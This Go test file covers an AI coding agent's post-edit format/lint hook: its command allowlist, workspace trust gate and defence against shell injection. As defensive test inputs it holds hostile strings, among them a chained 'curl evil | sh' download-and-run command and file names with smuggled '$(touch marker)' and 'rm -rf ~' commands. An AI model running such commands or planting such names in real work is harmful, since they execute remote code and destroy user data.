package tools

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/dereksantos/cortex/internal/projectcmd"
	"github.com/dereksantos/cortex/internal/shellrisk"
)

// hookDeps is headlessDeps plus the optional ProjectCommands capability
// (issue #129's post-edit hook) and the optional WorkspaceTrust capability
// (issue #129 round 7's trust gate). It lets the tests exercise write_file/
// edit_file end-to-end against a REAL temporary Go repo, exactly the way a
// serve/loop-hosted session runs a resolved Commands set. trusted defaults
// to false — untrusted is the safe default a session without a trust
// decision must apply.
type hookDeps struct {
	headlessDeps
	cmds    projectcmd.Commands
	trusted bool
}

func (d hookDeps) ProjectCommands() projectcmd.Commands { return d.cmds }

func (d hookDeps) WorkspaceTrusted() bool { return d.trusted }

// goRepoCmds mirrors what Discover returns for a Go module: a per-file gofmt
// (format) and a PER-PACKAGE go vet (lint, {dir} — go vet on one file
// type-checks it as its own package and reports spurious undefined: errors),
// both restricted to .go files. Both are allowlisted by step 3.
func goRepoCmds() projectcmd.Commands {
	return projectcmd.Commands{
		Format: projectcmd.Command{Cmd: "gofmt -w {file}", PerFile: true, Extends: []string{".go"}, Source: "go.mod"},
		Lint:   projectcmd.Command{Cmd: "go vet {dir}", Extends: []string{".go"}, Source: "go.mod"},
	}
}

func writeRepoFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// TestPostEditHookFormatsUnformattedFile is the core step-4 behavior: a
// write_file of an unformatted Go file lands, the hook runs the project's
// format command on it, writes back the formatted result, and notes it —
// without failing the write.
func TestPostEditHookFormatsUnformattedFile(t *testing.T) {
	root := t.TempDir()
	t.Chdir(root)
	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")

	// Unformatted: space-indented body, mis-spaced assignments.
	unformatted := "package main\n\nfunc main() {\n  x :=    1\n  _ = x\n}\n"
	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
		map[string]any{"path": "main.go", "content": unformatted}), hookDeps{cmds: goRepoCmds()})
	if err != nil {
		t.Fatalf("write_file: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(root, "main.go"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "  x :=    1") {
		t.Errorf("file should be gofmt-formatted by the hook, got %q", data)
	}
	if !strings.Contains(string(data), "\tx := 1") {
		t.Errorf("formatted file should use tabs, got %q", data)
	}
	if !strings.Contains(out, "formatted") {
		t.Errorf("tool result should note that the file was formatted, got %q", out)
	}
}

// TestPostEditHookSurfacesFailingLint: a well-formatted but vet-FAILING file
// must not fail the write — the hook runs the per-file lint and folds its
// failure into the tool result.
func TestPostEditHookSurfacesFailingLint(t *testing.T) {
	root := t.TempDir()
	t.Chdir(root)
	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")

	// Well-formatted (format step is a no-op) but vet-FAILING: %d with a
	// string argument.
	bad := "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Printf(\"%d\\n\", \"hello\")\n}\n"
	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
		map[string]any{"path": "bad.go", "content": bad}), hookDeps{cmds: goRepoCmds()})
	if err != nil {
		t.Fatalf("write_file must not fail because of a failing lint, got %v", err)
	}
	if !strings.Contains(out, "lint") {
		t.Errorf("tool result should surface the per-file lint, got %q", out)
	}
	if !strings.Contains(out, "%d") {
		t.Errorf("tool result should carry the lint's finding, got %q", out)
	}
}

// TestPostEditHookErrorNeverBlocksTheEdit: a REAL hook error — gofmt fails on
// syntactically broken Go (exit 2) — must not fail the write. The file is
// left exactly as written and the failure is folded into the result.
func TestPostEditHookErrorNeverBlocksTheEdit(t *testing.T) {
	root := t.TempDir()
	t.Chdir(root)
	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")

	// Broken Go: gofmt exits non-zero and leaves the file untouched.
	broken := "package main\n\nfunc broken( {\n"
	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
		map[string]any{"path": "x.go", "content": broken}), hookDeps{cmds: goRepoCmds()})
	if err != nil {
		t.Fatalf("a hook error must not fail the write, got %v", err)
	}
	data, err := os.ReadFile(filepath.Join(root, "x.go"))
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != broken {
		t.Errorf("the file must be unchanged when the format command errors, got %q", data)
	}
	if !strings.Contains(out, "error") {
		t.Errorf("tool result should report the format error, got %q", out)
	}
}

// TestPostEditHookRefusesNonAllowlistedFormat: a declared format command with
// shell control (a chained second command — the step-3 "malicious script"
// case) must NOT run, and its refusal must not fail the write.
func TestPostEditHookRefusesNonAllowlistedFormat(t *testing.T) {
	root := t.TempDir()
	t.Chdir(root)
	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")

	cmds := projectcmd.Commands{
		Format: projectcmd.Command{Cmd: "gofmt -w {file} && echo hacked", PerFile: true, Source: "package.json"},
	}
	before := "package main\n"
	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
		map[string]any{"path": "x.go", "content": before}), hookDeps{cmds: cmds})
	if err != nil {
		t.Fatalf("a hook refusal must not fail the write, got %v", err)
	}
	if data, _ := os.ReadFile(filepath.Join(root, "x.go")); string(data) != before {
		t.Errorf("the file must be unchanged when the hook refuses to run, got %q", data)
	}
	if !strings.Contains(out, "NOT run") {
		t.Errorf("tool result should note the command was not run, got %q", out)
	}
}

// TestPostEditHookReportsTimeout drives the real timeout path via the
// hookRunner seam: a format command that hangs is cut off by the budget, the
// hook reports the timeout, and the write still succeeds with the file left
// as written. (No allowlisted formatter ever hangs in practice, so the
// budget is unreachable end-to-end without this seam.)
func TestPostEditHookReportsTimeout(t *testing.T) {
	root := t.TempDir()
	t.Chdir(root)
	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")

	orig := hookRunner
	hookRunner = func(ctx context.Context, argv []string, dir string) (string, error) {
		return "", errHookTimeout // a hung command, budget expired
	}
	t.Cleanup(func() { hookRunner = orig })

	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
		map[string]any{"path": "y.go", "content": "package main\n"}), hookDeps{cmds: goRepoCmds()})
	if err != nil {
		t.Fatalf("a hook timeout must not fail the write, got %v", err)
	}
	if !strings.Contains(out, "timed out") {
		t.Errorf("tool result should note the timeout, got %q", out)
	}
	if data, _ := os.ReadFile(filepath.Join(root, "y.go")); string(data) != "package main\n" {
		t.Errorf("the file must be left as written when the hook times out")
	}
}

// TestPostEditHookRunsOnEditFile: the hook fires for edit_file too, not just
// write_file.
func TestPostEditHookRunsOnEditFile(t *testing.T) {
	root := t.TempDir()
	t.Chdir(root)
	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")
	// Start clean; the edit introduces an unformatted line (spaces, not tabs).
	writeRepoFile(t, filepath.Join(root, "m.go"), "package main\n\nfunc f() {\n\treturn\n}\n")

	out, err := Execute(context.Background(), callArgs(t, FunctionEditFile, map[string]any{
		"path":       "m.go",
		"old_string": "func f() {",
		"new_string": "func f() {\n  return",
	}), hookDeps{cmds: goRepoCmds()})
	if err != nil {
		t.Fatalf("edit_file: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(root, "m.go"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "  return") {
		t.Errorf("edit_file should have triggered the format hook, got %q", data)
	}
	if !strings.Contains(out, "formatted") {
		t.Errorf("edit_file result should note the format, got %q", out)
	}
}

// TestPostEditHookNoteComposesWithEditWarnings pins how the post-edit hook's
// note composes with the observations write_file/edit_file already make about
// the change (#153's line delta and removal WARNING, #141's large-deletion
// NOTE): every note survives, and the hook's note comes last — the tool's own
// account of the change it applied first, then what the project's commands
// said about the result.
func TestPostEditHookNoteComposesWithEditWarnings(t *testing.T) {
	orig := hookRunner
	hookRunner = func(ctx context.Context, argv []string, dir string) (string, error) {
		return "HOOK-OUTPUT-MARKER", nil
	}
	t.Cleanup(func() { hookRunner = orig })
	cmds := projectcmd.Commands{
		Lint: projectcmd.Command{Cmd: "go vet {dir}", Extends: []string{".go"}, Source: "go.mod"},
	}

	var body strings.Builder
	body.WriteString("package main\n\n")
	for i := 0; i < 30; i++ {
		body.WriteString("var v" + strings.Repeat("x", i+1) + " = 1\n")
	}
	full := body.String()
	tail := strings.TrimPrefix(full, "package main\n\n")

	for _, tc := range []struct {
		name  string
		call  ToolCall
		order []string
	}{
		{
			name: "edit_file",
			call: callArgs(t, FunctionEditFile, map[string]any{
				"path": "m.go", "old_string": tail, "new_string": "var v = 1\n",
			}),
			order: []string{"edited m.go", "lines); WARNING: removed", "NOTE: this change removed most", "HOOK-OUTPUT-MARKER"},
		},
		{
			name:  "write_file",
			call:  callArgs(t, FunctionWriteFile, map[string]any{"path": "m.go", "content": "package main\n"}),
			order: []string{"wrote 13 bytes to m.go", "NOTE: this change removed most", "HOOK-OUTPUT-MARKER"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			t.Chdir(root)
			writeRepoFile(t, filepath.Join(root, "m.go"), full)
			out, err := Execute(context.Background(), tc.call, hookDeps{cmds: cmds})
			if err != nil {
				t.Fatalf("%s: %v", tc.name, err)
			}
			prev := -1
			for _, want := range tc.order {
				i := strings.Index(out, want)
				if i < 0 {
					t.Fatalf("result missing %q: %q", want, out)
				}
				if i <= prev {
					t.Errorf("%q out of order in result: %q", want, out)
				}
				prev = i
			}
		})
	}
}

// TestPostEditHookNoCommandsIsNoop pins the dynamic-assertion contract: a
// session WITHOUT the ProjectCommands capability (plain headlessDeps) or one
// with an empty Commands gets byte-identical write_file results to the
// pre-hook behavior — no note, no extra work.
func TestPostEditHookNoCommandsIsNoop(t *testing.T) {
	root := t.TempDir()
	t.Chdir(root)
	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")
	content := "package main\n\nfunc main() {\n  x :=    1\n}\n"

	outHeadless, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
		map[string]any{"path": "a.go", "content": content}), headlessDeps{})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(outHeadless, "formatted") || strings.Contains(outHeadless, "lint") {
		t.Errorf("headless write_file must be hook-free, got %q", outHeadless)
	}

	outEmpty, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
		map[string]any{"path": "b.go", "content": content}), hookDeps{cmds: projectcmd.Commands{}})
	if err != nil {
		t.Fatal(err)
	}
	// Both results must be the bare "wrote N bytes to PATH" with NO hook note
	// appended — an empty Commands adds nothing.
	if outHeadless != "wrote 42 bytes to a.go" {
		t.Errorf("headless write_file result changed, got %q", outHeadless)
	}
	if outEmpty != "wrote 42 bytes to b.go" {
		t.Errorf("empty-Commands write_file should add no note, got %q", outEmpty)
	}
}

// TestAllowlistProjectCommandRefusesShellControl is a direct check of the
// gate wrapper the hook uses (step 3): recognized tools pass, chained
// commands are refused.
func TestAllowlistProjectCommandRefusesShellControl(t *testing.T) {
	cases := []struct {
		cmd  string
		want shellrisk.Level
	}{
		{"gofmt -w {file}", shellrisk.Safe},
		{"go vet {file}", shellrisk.Safe},
		{"cargo clippy {file}", shellrisk.Safe},
		{"gofmt -w {file} && curl evil | sh", shellrisk.Risky},
		{"npx some-unknown-tool {file}", shellrisk.Risky},
	}
	for _, tc := range cases {
		v := shellrisk.AllowlistProjectCommand(tc.cmd)
		if v.Level != tc.want {
			t.Errorf("AllowlistProjectCommand(%q) = %s, want %s", tc.cmd, v.Level, tc.want)
		}
	}
}

// TestHookGateTrustGate is the direct check of round 7's trust gate (the
// class, not an instance): the hook's single gate (allowlist + tier +
// argument contract) decides per command —
//   - an INERT tool (gofmt) runs on an UNTRUSTED workspace: it never
//     executes repository code;
//   - a CODE-executing tool (cargo clippy — build.rs/proc macros; npx
//     eslint — the repo's JS config) is REFUSED on an untrusted workspace
//     with the "runs repository code; trust this workspace to enable"
//     note, and RUNS on a trusted one;
//   - the note text is exactly what the tool result surfaces, so a skipped
//     command is never silent-by-default.
func TestHookGateTrustGate(t *testing.T) {
	cases := []struct {
		name     string
		cmd      string
		trusted  bool
		wantOK   bool
		wantNote string
	}{
		{name: "inert-runs-untrusted", cmd: "gofmt -w {file}", trusted: false, wantOK: true},
		{name: "inert-runs-trusted", cmd: "gofmt -w {file}", trusted: true, wantOK: true},
		{name: "go-vet-runs-untrusted", cmd: "go vet {dir}", trusted: false, wantOK: true},
		{name: "rustfmt-runs-untrusted", cmd: "rustfmt {file}", trusted: false, wantOK: true},
		{name: "ruff-check-runs-untrusted", cmd: "ruff check {file}", trusted: false, wantOK: true},
		{name: "black-runs-untrusted", cmd: "black {file}", trusted: false, wantOK: true},
		{name: "cargo-fmt-runs-untrusted", cmd: "cargo fmt", trusted: false, wantOK: true},
		{name: "clippy-blocked-untrusted", cmd: "cargo clippy {file}", trusted: false, wantOK: false,
			wantNote: "runs repository code; trust this workspace to enable"},
		{name: "clippy-runs-trusted", cmd: "cargo clippy {file}", trusted: true, wantOK: true},
		{name: "eslint-blocked-untrusted", cmd: "eslint {file}", trusted: false, wantOK: false,
			wantNote: "runs repository code; trust this workspace to enable"},
		{name: "eslint-runs-trusted", cmd: "eslint {file}", trusted: true, wantOK: true},
		{name: "npx-eslint-blocked-untrusted", cmd: "npx eslint {file}", trusted: false, wantOK: false,
			wantNote: "runs repository code; trust this workspace to enable"},
		{name: "npx-eslint-runs-trusted", cmd: "npx eslint {file}", trusted: true, wantOK: true},
		{name: "npm-run-blocked-untrusted", cmd: "npm run lint", trusted: false, wantOK: false,
			wantNote: "runs repository code; trust this workspace to enable"},
		{name: "npm-run-runs-trusted", cmd: "npm run lint", trusted: true, wantOK: true},
		// A shell-chained command is refused by the allowlist, NOT the trust
		// gate — trust is irrelevant to it (it would be refused trusted too).
		{name: "chained-refused-untrusted", cmd: "gofmt -w {file} && curl evil", trusted: false, wantOK: false,
			wantNote: "project command contains shell-control characters"},
		{name: "chained-refused-trusted", cmd: "gofmt -w {file} && curl evil", trusted: true, wantOK: false,
			wantNote: "project command contains shell-control characters"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			argv, ok, note := hookGate(tc.cmd, "", "a.go", tc.trusted)
			if ok != tc.wantOK {
				t.Fatalf("hookGate(%q, trusted=%v) ok = %v, want %v (note %q)", tc.cmd, tc.trusted, ok, tc.wantOK, note)
			}
			if tc.wantOK {
				if note != "" {
					t.Errorf("ok gate must have an empty note, got %q", note)
				}
				if len(argv) == 0 {
					t.Errorf("ok gate must produce an argv, got none")
				}
			} else if note != tc.wantNote {
				t.Errorf("refusal note = %q, want %q", note, tc.wantNote)
			}
		})
	}
}

// TestPostEditHookTrustGateEndToEnd is the end-to-end proof of the trust
// gate through the REAL write_file path (Execute → runProjectCommandHook):
// the same unformatted Rust-adjacent fixture, a cargo-clippy lint command,
// and the two trust states. Untrusted: the write succeeds, the file is
// left exactly as written, and the result carries the skip note (never a
// silent run of the repo's code). Trusted: the hook runs the lint. The
// hookRunner seam fakes the clippy run so the test never needs a Rust
// toolchain — it drives the same code path the real runner takes.
func TestPostEditHookTrustGateEndToEnd(t *testing.T) {
	lintCmds := projectcmd.Commands{
		Format: projectcmd.Command{Cmd: "cargo fmt", PerFile: false, Source: "Cargo.toml"},
		Lint:   projectcmd.Command{Cmd: "cargo clippy {file}", PerFile: true, Source: "Cargo.toml"},
	}
	run := false
	orig := hookRunner
	hookRunner = func(ctx context.Context, argv []string, dir string) (string, error) {
		run = true
		return "clippy: ok", nil
	}
	t.Cleanup(func() { hookRunner = orig })

	for _, tc := range []struct {
		name        string
		userTrusted bool
		wantSkipped bool
	}{
		{name: "untrusted-skips", userTrusted: false, wantSkipped: true},
		{name: "trusted-runs", userTrusted: true, wantSkipped: false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			run = false
			root := t.TempDir()
			t.Chdir(root)
			writeRepoFile(t, filepath.Join(root, "main.go"), "package main\n")
			deps := hookDeps{cmds: lintCmds, trusted: userTrustFromConfigs(t, root, tc.userTrusted)}
			out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
				map[string]any{"path": "main.go", "content": "package main\n"}), deps)
			if err != nil {
				t.Fatalf("write_file must succeed regardless of trust state, got %v", err)
			}
			if tc.wantSkipped {
				if !strings.Contains(out, "skipped: cargo clippy {file} runs repository code; trust this workspace to enable") {
					t.Errorf("untrusted: expected the trust-gate skip note, got %q", out)
				}
				if run {
					t.Errorf("untrusted: the code-executing lint must NOT have run")
				}
			} else {
				if run != true {
					t.Errorf("trusted: the code-executing lint must have run")
				}
				if !strings.Contains(out, "clippy: ok") {
					t.Errorf("trusted: expected the lint output folded into the result, got %q", out)
				}
			}
		})
	}
}

// userTrustFromConfigs resolves the session's trust state the way a REAL
// session resolves it (the composition cmd/cortex's
// CortexSession.WorkspaceTrusted performs — the same package can't be
// linked here without an import cycle): trust comes ONLY from the
// USER-level config (redirected via $CORTEX_HOME), matching the root by
// normalized path; the repository's own .cortex/config.json is never
// consulted. This is the value the hookDeps trusted flag takes, so the
// hook tests below exercise the gate the session actually surfaces — never
// a test-decided stand-in for a repo-controlled file.
func userTrustFromConfigs(t *testing.T, root string, userTrusted bool) bool {
	t.Helper()
	userHome := t.TempDir()
	t.Setenv("CORTEX_HOME", userHome)
	if userTrusted {
		// The operator's user config lists the root (as `cortex project
		// trust add` would store it, absolute).
		cfg, err := json.Marshal(map[string]any{"project": map[string]any{"trusted": []string{root}}})
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(userHome, "config.json"), cfg, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// Read it back through the same shape the session sees.
	var store struct {
		Project struct {
			Trusted []string `json:"trusted"`
		} `json:"project"`
	}
	data, rerr := os.ReadFile(filepath.Join(userHome, "config.json"))
	if rerr != nil {
		return false // absent user config → untrusted (the safe default)
	}
	if uerr := json.Unmarshal(data, &store); uerr != nil {
		t.Fatalf("user config must parse: %v", uerr)
	}
	want := normalizeTrustRoot(root)
	for _, e := range store.Project.Trusted {
		e = strings.TrimSpace(e)
		if e == want {
			return true
		}
	}
	return false
}

// normalizeTrustRoot is this test's copy of the session's trust-path
// canonicalization (absolute; symlinks resolved when possible, trailing
// slash trimmed) — kept local because the canonical implementation lives in
// cmd/cortex (the import-cycle constraint above).
func normalizeTrustRoot(p string) string {
	base := strings.TrimSuffix(p, "/")
	if abs, err := filepath.Abs(base); err == nil {
		if real, err := filepath.EvalSymlinks(abs); err == nil {
			return real
		}
		return abs
	}
	return base
}

// TestSplitProjectCommand pins the template-to-argv contract: the allowlisted
// template is split once, and {file}/{dir} are each substituted as ONE argv
// element — a path with spaces or shell metacharacters is never re-split,
// so it can never be interpreted as shell syntax (the hook execs argv
// directly; there is no bash -c path).
func TestSplitProjectCommand(t *testing.T) {
	cases := []struct {
		name     string
		template string
		root     string
		path     string
		want     []string
	}{
		{
			name: "per-file", template: "gofmt -w {file}", path: "main.go",
			want: []string{"gofmt", "-w", "main.go"},
		},
		{
			name: "per-package", template: "go vet {dir}", path: "main.go",
			want: []string{"go", "vet", "./"},
		},
		{
			name: "subdir", template: "go vet {dir}", path: "pkg/sub/a.go",
			want: []string{"go", "vet", "./pkg/sub"},
		},
		{
			name: "anchored-subdir-relative-to-root", template: "go vet {dir}", root: "/repo", path: "/repo/pkg/sub/a.go",
			want: []string{"go", "vet", "./pkg/sub"},
		},
		{
			name: "anchored-root-file", template: "go vet {dir}", root: "/repo", path: "/repo/main.go",
			want: []string{"go", "vet", "./"},
		},
		{
			name:     "anchored-shell-metacharacters-one-argument",
			template: "gofmt -w {file}", root: "/repo",
			path: "/repo/x$(touch marker).go",
			want: []string{"gofmt", "-w", "/repo/x$(touch marker).go"},
		},
		{
			name:     "spaces-in-path-are-one-argument",
			template: "gofmt -w {file}", path: "dir with space/main.go",
			want: []string{"gofmt", "-w", "dir with space/main.go"},
		},
		{
			name:     "shell-metacharacters-are-one-argument",
			template: "gofmt -w {file}", path: "x$(touch marker).go",
			want: []string{"gofmt", "-w", "x$(touch marker).go"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := splitProjectCommand(tc.template, tc.root, tc.path)
			if len(got) != len(tc.want) {
				t.Fatalf("splitProjectCommand(%q, root=%q, %q) = %v (len %d), want %v (len %d)",
					tc.template, tc.root, tc.path, got, len(got), tc.want, len(tc.want))
			}
			for i := range got {
				if got[i] != tc.want[i] {
					t.Errorf("argv[%d] = %q, want %q (full: %v)", i, got[i], tc.want[i], got)
					break
				}
			}
		})
	}
}

// TestSplitAndCheckArgsRefusesShellShapedPaths is the argument-contract half
// of the injection defense: SubstitutedArgs re-scans the model-controlled
// value that replaces {file}/{dir}, and a shell-shaped "path" is declined
// (ok=false) instead of handed to the tool.
func TestSplitAndCheckArgsRefusesShellShapedPaths(t *testing.T) {
	if _, ok := splitAndCheckArgs("gofmt -w {file}", "", "x$(touch marker).go"); ok {
		t.Error("a path containing $(...) must be refused, not substituted")
	}
	if _, ok := splitAndCheckArgs("go vet {dir}", "", "a;rm -rf ~;.go"); ok {
		t.Error("a path containing a ; chain must be refused, not substituted")
	}
	if _, ok := splitAndCheckArgs("gofmt -w {file}", "/repo", "/repo/x$(touch marker).go"); ok {
		t.Error("an anchored path containing $(...) must be refused, not substituted")
	}
	if argv, ok := splitAndCheckArgs("gofmt -w {file}", "", "plain.go"); !ok {
		t.Fatalf("a plain path must pass the argument check")
	} else if len(argv) != 3 || argv[2] != "plain.go" {
		t.Errorf("argv = %v, want the path as one final argument", argv)
	}
}

// TestSplitAndCheckArgsPinsNPXBeforeTheTool is the placement half of the
// npx no-install pin: the hook's argv builder must insert --no right after
// `npx` (index 1), BEFORE the tool name. npx stops parsing its own options
// at the first positional and forwards everything after it to the tool, so
// a trailing pin would land in eslint/prettier's argv as THEIR flag —
// eslint would fail with an invalid option, and npx itself would still
// perform the registry install the pin is meant to prevent.
func TestSplitAndCheckArgsPinsNPXBeforeTheTool(t *testing.T) {
	for _, tc := range []struct {
		name     string
		template string
	}{
		{"declared-eslint", "npx eslint {file}"},
		{"discovered-prettier-fallback", "npx prettier --write {file}"},
		{"already-pinned-is-idempotent", "npx --no eslint {file}"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			argv, ok := splitAndCheckArgs(tc.template, "", "a.ts")
			if !ok {
				t.Fatalf("an allowlisted npx template must pass the argument check, got %v", argv)
			}
			if len(argv) < 2 {
				t.Fatalf("argv = %v, want at least npx + --no", argv)
			}
			if argv[0] != "npx" || argv[1] != "--no" {
				t.Errorf("argv[:2] = %v, want [npx --no] — the pin must precede the tool name (full: %v)", argv[:2], argv)
			}
		})
	}
}

// TestPostEditHookDoesNotShellInject is the security regression test for the
// round-1 blocker: a write_file of a file NAMED like a shell payload must
// not execute it. Under the old bash -c splice, "x$(touch marker).go" ran
// `touch marker` (and "a;rm -rf ~;.go" would have chained a command) —
// bypassing shellrisk entirely. The hook now splits the allowlisted template
// and execs it as argv, so the name is one inert argument, the marker is
// never created, and the edit still succeeds.
func TestPostEditHookDoesNotShellInject(t *testing.T) {
	for _, evilName := range []string{"x$(touch marker).go", "a;touch marker;.go"} {
		t.Run(evilName, func(t *testing.T) {
			root := t.TempDir()
			t.Chdir(root)
			writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")

			out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
				map[string]any{"path": evilName, "content": "package main\n"}), hookDeps{cmds: goRepoCmds()})
			if err != nil {
				t.Fatalf("write_file must succeed regardless of the file name, got %v", err)
			}
			if _, statErr := os.Stat(filepath.Join(root, "marker")); statErr == nil {
				t.Fatalf("a marker file exists — the file name was executed through a shell (result: %q)", out)
			}
			// The path is shell-shaped, so the hook declines to run the
			// allowlisted commands on it (the refusal is visible for format)
			// — but it never blocks the write.
			if !strings.Contains(out, "note:") {
				t.Errorf("expected the argument-refusal note, got %q", out)
			}
			if !strings.HasPrefix(out, "wrote ") {
				t.Errorf("the write result must still lead, got %q", out)
			}
		})
	}
}

// TestPostEditHookSkipsNonSourceFiles is the Extends-gate behavior: in a Go
// project (gofmt restricted to .go), a write_file of a README.md must come
// back as EXACTLY the plain write result — no format run, no spurious
// 'ran with an error' note, no lint note.
func TestPostEditHookSkipsNonSourceFiles(t *testing.T) {
	root := t.TempDir()
	t.Chdir(root)
	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")

	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
		map[string]any{"path": "README.md", "content": "# t\n"}), hookDeps{cmds: goRepoCmds()})
	if err != nil {
		t.Fatalf("write_file: %v", err)
	}
	if out != "wrote 4 bytes to README.md" {
		t.Errorf("non-source write in a Go project must be note-free, got %q", out)
	}
}

// TestPostEditHookWholePackageVetIsSilent pins the {dir} substitution against
// the real toolchain: two files in one package where a.go CALLS a function
// defined in b.go. A per-file `go vet a.go` would type-check a.go as its own
// package and report a spurious 'undefined: helper' on every edit; the
// whole-package `go vet ./sub` type-checks both files together and is clean
// — so the hook must run it and stay silent (no note at all).
func TestPostEditHookWholePackageVetIsSilent(t *testing.T) {
	root := t.TempDir()
	t.Chdir(root)
	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")
	if err := os.MkdirAll(filepath.Join(root, "sub"), 0o755); err != nil {
		t.Fatal(err)
	}
	// b.go already defines the cross-file symbol (pre-existing, clean).
	writeRepoFile(t, filepath.Join(root, "sub", "b.go"),
		"package sub\n\nfunc helper() int {\n\treturn 42\n}\n")

	// a.go is unformatted (so the format note IS expected) and calls
	// helper from its sibling file.
	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
		map[string]any{"path": "sub/a.go", "content": "package sub\n\nfunc main() {\n  _ = helper()\n}\n"}), hookDeps{cmds: goRepoCmds()})
	if err != nil {
		t.Fatalf("write_file: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(root, "sub", "a.go"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "  _ = helper()") {
		t.Errorf("a.go should be gofmt-formatted, got %q", data)
	}
	if !strings.Contains(out, "formatted") {
		t.Errorf("expected the format note, got %q", out)
	}
	// The per-package vet of sub/ must have run CLEAN: any 'undefined:' or
	// other vet finding would surface as a lint note.
	if strings.Contains(out, "lint") || strings.Contains(out, "undefined:") || strings.Contains(out, "vet") {
		t.Errorf("whole-package vet of a cross-file package must stay silent, got %q", out)
	}
}
